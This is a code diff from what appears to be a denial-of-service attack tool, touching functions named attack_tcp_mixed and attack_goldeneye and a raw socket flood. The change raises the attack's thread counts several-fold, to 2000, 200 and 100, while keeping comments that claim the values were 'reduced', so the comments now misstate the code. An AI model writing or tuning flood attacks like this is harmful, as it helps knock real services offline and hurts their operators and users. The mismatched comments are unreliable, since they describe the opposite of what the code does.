@@ -29,7 +29,7 @@ USER_AGENTS = [
 ]
 
 # Thread management
-MAX_THREADS = 200  # Reduced to prevent overloading clients
+MAX_THREADS = 2000  # Reduced to prevent overloading clients
 active_threads = threading.Semaphore(MAX_THREADS)
 
 # Target resolution with caching
@@ -343,7 +343,7 @@ def attack_tcp_mixed(target, duration):
     
     # Start more threads for raw socket flood
     threads = []
-    thread_count = 20  # Reduced from 100/50
+    thread_count = 200  # Reduced from 100/50
     
     for _ in range(thread_count):
         t = threading.Thread(target=flood)
@@ -596,7 +596,7 @@ def attack_goldeneye(target, duration):
                 time.sleep(0.1)
     
     threads = []
-    for _ in range(30):  # Reduced from 75
+    for _ in range(100):  # Reduced from 75
         t = threading.Thread(target=goldeneye)
         t.daemon = True
         threads.append(t)
